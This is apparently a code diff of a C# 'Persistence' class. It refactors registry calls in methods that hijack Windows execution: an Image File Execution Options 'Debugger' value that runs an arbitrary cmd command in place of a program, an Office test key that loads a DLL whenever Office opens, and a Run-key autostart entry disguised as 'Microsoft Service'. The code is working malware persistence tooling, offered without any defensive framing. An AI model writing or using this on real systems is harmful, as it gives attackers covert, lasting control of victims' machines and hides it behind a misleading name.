@@ -39,10 +39,11 @@ namespace Persistence
         /// <param name="commandToExecute">The command that should be executed</param>
         public void ReplaceProgram(string programName, string commandToExecute)
         {
-            var subkey = registryKey.OpenSubKey(@$"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{programName}",
-                              true);
-            ArgumentNullException.ThrowIfNull(subkey);
-            subkey.SetValue("Debugger", $"cmd /C {commandToExecute}", RegistryValueKind.String);
+            //var subkey = registryKey.OpenSubKey(@$"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{programName}",
+            //                  true);
+            //ArgumentNullException.ThrowIfNull(subkey);
+            var subKey = WindowsRegistry.OpenLocalMachineKey(@$"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{programName}");
+            subKey.SetValue("Debugger", $"cmd /C {commandToExecute}", RegistryValueKind.String);
 
             // subkey.DeleteValue("Debugger");
         }
@@ -78,7 +79,7 @@ namespace Persistence
         /// <param name="pathToDll">A dll file that should be executed</param>
         public void ExecCommandOnOfficeOpening(string pathToDll)
         {
-            registryKey = Registry.CurrentUser;
+            RegistryKey registryKey = Registry.CurrentUser;
             registryKey.CreateSubKey(@$"Software\Microsoft\Office test\Special\Perf", true);
             var subKey = registryKey.OpenSubKey(@$"Software\Microsoft\Office test\Special\Perf", true);
             ArgumentNullException.ThrowIfNull(subKey);
@@ -93,9 +94,10 @@ namespace Persistence
         /// <param name="pathToExe">An exe file that should be executed</param>
         public void ExecOnStartup(string pathToExe)
         {
-            registryKey = Registry.CurrentUser;
-            var subKey = registryKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
-            ArgumentNullException.ThrowIfNull(subKey);
+            //registryKey = Registry.CurrentUser;
+            //var subKey = registryKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+            // ArgumentNullException.ThrowIfNull(subKey);
+            var subKey = WindowsRegistry.OpenCurrentUserKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
             subKey.SetValue("Microsoft Service", @$"{pathToExe}", RegistryValueKind.String);
         }
     }
